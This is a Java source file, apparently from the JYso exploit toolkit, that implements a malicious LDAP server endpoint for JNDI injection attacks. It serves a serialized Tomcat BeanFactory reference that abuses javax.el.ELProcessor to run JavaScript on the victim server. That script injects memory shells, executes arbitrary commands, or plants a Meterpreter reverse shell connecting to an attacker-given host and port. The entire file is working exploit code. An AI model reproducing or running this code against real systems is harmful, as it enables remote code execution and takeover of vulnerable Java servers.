package com.qi4l.JYso.controllers;

import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.InjShell;
import com.qi4l.JYso.gadgets.utils.Utils;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import javax.naming.StringRefAddr;
import java.lang.reflect.Field;

@SuppressWarnings("unused")
@LdapMapping(uri = {"/elprocessor"})
public class ELProcessorController extends BaseLdapController {
    private static final String SCRIPT_TEMPLATE = "{\"\"}.getClass().forName(\"javax.script.ScriptEngineManager\")"
            + ".newInstance().getEngineByName(\"JavaScript\")"
            + ".eval(\"%s\")}";
    private static final Logger log = LogManager.getLogger(ELProcessorController.class);

    private String payloadType;
    private String[] params = new String[0];

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        try {
            Entry entry = new Entry(base);
            entry.addAttribute("javaClassName", "java.lang.String");

            ResourceRef ref = new ResourceRef(
                    "javax.el.ELProcessor",
                    null,
                    "",
                    "",
                    true,
                    "org.apache.naming.factory.BeanFactory",
                    null
            );
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", buildPayloadScript()));

            entry.addAttribute("javaSerializedData", Utils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception er) {
            System.err.println("Error while generating or serializing payload");
            log.error("Error while generating or serializing payload", er);
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        ParseResult result = parseBase(base, "- JNDI LDAP Local Reference Links + ELProcessor");
        payloadType = result.payloadType;
        params = result.params;
    }

    private String buildPayloadScript() throws Exception {
        TomcatBypassHelper helper = new TomcatBypassHelper();
        String scriptBody;

        if (payloadType.contains("E-")) {
            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(suffixAfterDash(payloadType)));
            scriptBody = InjShell.injectClass(echoClass);
        } else if (payloadType.contains("M-")) {
            scriptBody = Gadgets.createClassT(suffixAfterDash(payloadType));
        } else if (payloadType.contains("command")) {
            scriptBody = helper.getExecCode(params[0]);
        } else if (payloadType.contains("msf")) {
            scriptBody = helper.injectInterpreter();
        } else {
            throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
        }

        return SCRIPT_TEMPLATE.replace("%s", scriptBody.replace("\"", "\\\""));
    }

    private class TomcatBypassHelper {
        String injectInterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            Class<?> clazz = Class.forName("com.qi4l.JYso.template.com.qi4l.JYso.template.Meterpreter");
            Field host = clazz.getDeclaredField("host");
            host.setAccessible(true);
            host.set(clazz, params[0]);

            Field port = clazz.getDeclaredField("port");
            port.setAccessible(true);
            port.set(clazz, params[1]);
            return InjShell.injectClass(clazz);
        }

        String getExecCode(String cmd) {
            return BaseLdapController.getExecCode(cmd);
        }
    }
}
